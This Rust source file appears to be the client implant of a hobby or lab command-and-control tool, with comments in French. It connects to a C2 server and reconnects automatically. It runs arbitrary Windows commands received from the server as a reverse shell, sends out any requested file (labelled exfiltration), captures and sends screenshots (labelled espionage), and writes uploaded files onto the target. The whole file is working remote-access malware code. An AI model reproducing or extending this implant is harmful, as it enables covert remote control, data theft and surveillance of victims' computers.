use tokio::net::TcpStream;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use std::error::Error;
use common::Message;
use std::process::Command;
use std::fs;
use screenshots::Screen; 
use std::time::{SystemTime, UNIX_EPOCH};
use std::io::Cursor;
use screenshots::image::ImageFormat;
use std::env; // <-- NOUVEL IMPORT

// Fonction pour exécuter les commandes Windows
fn execute_cmd(cmd: &str) -> String {
    let output = Command::new("cmd").args(&["/C", cmd]).output();
    match output {
        Ok(o) => {
            let mut res = String::from_utf8_lossy(&o.stdout).to_string();
            if !o.stderr.is_empty() { res.push_str(&String::from_utf8_lossy(&o.stderr)); }
            if res.is_empty() { 
                // Si la commande ne retourne rien (comme un 'dir' vide), on retourne un message par défaut.
                // Cela aide aussi si la commande `cd` était passée par erreur ici.
                return "Commande exécutée (vide).".to_string(); 
            }
            res
        },
        Err(e) => format!("Erreur système : {}", e),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let server_addr = "127.0.0.1:8080";
    println!("Tentative de connexion à {}...", server_addr);
    
    // On boucle pour réessayer la connexion si ça échoue (reconnexion automatique basique)
    loop {
        match TcpStream::connect(server_addr).await {
            Ok(stream) => {
                println!("Connecté au C2 !");
                let (read_half, mut write_half) = stream.into_split();
                let mut reader = BufReader::new(read_half);
                let mut line = String::new();

                loop {
                    line.clear();
                    let bytes = reader.read_line(&mut line).await.unwrap_or(0);
                    if bytes == 0 { break; }

                    let json = line.trim();
                    if let Ok(message) = serde_json::from_str::<Message>(json) {
                        match message {
                            Message::Command(raw_cmd) => {
                                let cmd = raw_cmd.trim();
                                println!("Ordre reçu : '{}'", cmd);

                                // --- LOGIQUE DE TRI ---
                                if cmd.starts_with("download ") {
                                    // ... Code download (Exfiltration) ...
                                    let filename = cmd.strip_prefix("download ").unwrap().trim();
                                    match fs::read(filename) {
                                        Ok(data) => {
                                            let msg = Message::File { name: filename.to_string(), content: data };
                                            let mut json_resp = serde_json::to_string(&msg).unwrap();
                                            json_resp.push('\n');
                                            write_half.write_all(json_resp.as_bytes()).await.unwrap();
                                        },
                                        Err(e) => {
                                            let err = Message::Error(format!("Erreur fichier: {}", e));
                                            let mut s = serde_json::to_string(&err).unwrap();
                                            s.push('\n');
                                            write_half.write_all(s.as_bytes()).await.unwrap();
                                        }
                                    }
                                } 
                                else if cmd == "screenshot" {
                                    // ... Code screenshot (Espionnage) ...
                                    println!("Prise de screenshot en cours...");
                                    let screens = Screen::all().unwrap_or(vec![]);
                                    if screens.is_empty() {
                                        let err = Message::Error("Aucun écran détecté".to_string());
                                        let mut s = serde_json::to_string(&err).unwrap();
                                        s.push('\n');
                                        write_half.write_all(s.as_bytes()).await.unwrap();
                                    } else {
                                        let screen = screens[0];
                                         match screen.capture() {
                                            Ok(image) => {
                                                let mut buffer = Vec::new();
                                                let mut cursor = Cursor::new(&mut buffer);
                                                
                                                image.write_to(&mut cursor, ImageFormat::Png).unwrap();
                                                
                                                let start = SystemTime::now();
                                                let since_the_epoch = start.duration_since(UNIX_EPOCH).unwrap();
                                                let filename = format!("screen_{}.png", since_the_epoch.as_secs());

                                                let msg = Message::File { name: filename, content: buffer };
                                                let mut json_resp = serde_json::to_string(&msg).unwrap();
                                                json_resp.push('\n');
                                                write_half.write_all(json_resp.as_bytes()).await.unwrap();
                                                println!("Screenshot envoyé.");
                                            },
                                            Err(e) => {
                                                let err = Message::Error(format!("Erreur capture: {}", e));
                                                let mut s = serde_json::to_string(&err).unwrap();
                                                s.push('\n');
                                                write_half.write_all(s.as_bytes()).await.unwrap();
                                            }
                                        }
                                    }
                                }
                                // --- NOUVEAU BLOC POUR LA COMMANDE 'cd' ---
                                else if cmd.starts_with("cd ") {
                                    let path = cmd.strip_prefix("cd ").unwrap().trim();
                                    let response = match env::set_current_dir(path) {
                                        Ok(_) => {
                                            let new_cwd = env::current_dir().map_or(
                                                "Répertoire inconnu.".to_string(), 
                                                |p| format!("{}", p.display())
                                            );
                                            Message::Output(format!("Répertoire changé. Nouveau CWD : {}", new_cwd))
                                        },
                                        Err(e) => Message::Error(format!("Impossible de changer de répertoire : {}", e)),
                                    };
                                    
                                    let mut s = serde_json::to_string(&response).unwrap();
                                    s.push('\n');
                                    write_half.write_all(s.as_bytes()).await.unwrap();
                                }
                                // -------------------------------------------
                                else {
                                    // Commande système classique (Reverse Shell)
                                    println!("Commande système classique...");
                                    let output = execute_cmd(cmd);
                                    let resp = Message::Output(output);
                                    let mut s = serde_json::to_string(&resp).unwrap();
                                    s.push('\n');
                                    write_half.write_all(s.as_bytes()).await.unwrap();
                                }
                            },
                            Message::File { name, content } => {
                                // ... Code Upload inchangé ...
                                println!("Réception du fichier : {} ({} octets)", name, content.len());
                                match fs::write(&name, content) {
                                    Ok(_) => {
                                        let msg = Message::Output(format!("✅ Fichier '{}' sauvegardé sur la cible.", name));
                                        let mut s = serde_json::to_string(&msg).unwrap();
                                        s.push('\n');
                                        write_half.write_all(s.as_bytes()).await.unwrap();
                                    },
                                    Err(e) => {
                                        let err = Message::Error(format!("❌ Erreur d'écriture du fichier sur la cible: {}", e));
                                        let mut s = serde_json::to_string(&err).unwrap();
                                        s.push('\n');
                                        write_half.write_all(s.as_bytes()).await.unwrap();
                                    }
                                }
                            },
                            _ => {}
                        }
                    }
                }
                println!("Déconnecté. Nouvelle tentative dans 5 secondes...");
            }
            Err(_) => {
                // Si le serveur n'est pas là, on attend
            }
        }
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    }
}